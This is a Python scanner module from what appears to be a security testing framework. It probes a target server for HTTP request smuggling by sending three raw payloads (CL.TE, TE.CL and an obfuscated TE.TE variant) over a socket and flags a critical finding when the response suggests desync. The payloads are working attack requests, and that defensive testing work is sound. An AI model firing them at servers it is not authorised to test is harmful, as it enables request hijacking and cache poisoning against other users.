import asyncio
import time
from .base import BaseScanner
from .registry import register_scanner
from core.models import ScannerManifest, ScanTarget, FindingSeverity

CL_TE_PAYLOAD = (
    "POST /{path} HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 49\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /404 HTTP/1.1\r\n"
    "X-Ignore: X\r\n"
    "\r\n"
)

TE_CL_PAYLOAD = (
    "POST /{path} HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "5c\r\n"
    "POST /404 HTTP/1.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 15\r\n"
    "\r\n"
    "x=1\r\n"
    "0\r\n"
    "\r\n"
)

TE_TE_PAYLOAD_OBFUSCATED = (
    "POST /{path} HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Transfer-encoding: x\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /404 HTTP/1.1\r\n"
    "X-Ignore: X\r\n"
    "\r\n"
)


@register_scanner(manifest=ScannerManifest(
    name="smuggling_scanner",
    category="exploit",
    risk_level="aggressive",
    estimated_cost=80,
    produces_tag_patterns=["smuggling", "request-smuggling", "cl-te", "te-cl"],
    produces_endpoint_types=[],
))
class SmugglingScanner(BaseScanner):
    name = "smuggling_scanner"

    async def _raw_http_request(self, host: str, port: int, raw: bytes, use_ssl: bool) -> bytes:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=use_ssl),
                timeout=10,
            )
            writer.write(raw)
            await writer.drain()
            resp = await asyncio.wait_for(reader.read(4096), timeout=15)
            writer.close()
            return resp
        except Exception:
            return b""

    async def scan(self, target: ScanTarget) -> tuple[list, list]:
        findings = []
        endpoints = []
        parsed = target.get_url()
        host = parsed.hostname or "localhost"
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_ssl = parsed.scheme == "https"
        path = parsed.path or "/"

        attack_configs = [
            ("CL.TE", CL_TE_PAYLOAD),
            ("TE.CL", TE_CL_PAYLOAD),
            ("TE.TE (obfuscated)", TE_TE_PAYLOAD_OBFUSCATED),
        ]

        for attack_name, tpl in attack_configs:
            raw_request = tpl.format(host=host, path=path.lstrip("/"))
            raw_bytes = raw_request.encode("utf-8", errors="replace")

            resp = await self._raw_http_request(host, port, raw_bytes, use_ssl)
            self._stats["requests"] += 1
            resp_text = resp.decode("utf-8", errors="replace")

            if "404" in resp_text and ("HTTP/1.1 200" in resp_text or "HTTP/1.1 404" in resp_text):
                ep = self.make_endpoint(url=target.url, status_code=200, discovered_by=self.name)
                endpoints.append(ep)
                findings.append(self.make_finding(
                    title=f"HTTP Request Smuggling ({attack_name})",
                    description=f"Server at {host}:{port} appears vulnerable to {attack_name} smuggling. "
                                f"Follow-up request to /404 was ingested as part of the smuggled connection.",
                    severity=FindingSeverity.CRITICAL.value,
                    endpoint=ep,
                    evidence={"host": host, "port": port, "attack": attack_name, "raw_response": resp_text[:500]},
                    confidence=0.8,
                    tags=["smuggling", attack_name.lower().replace(".", "-").replace(" ", "-")],
                ))

        return findings, endpoints
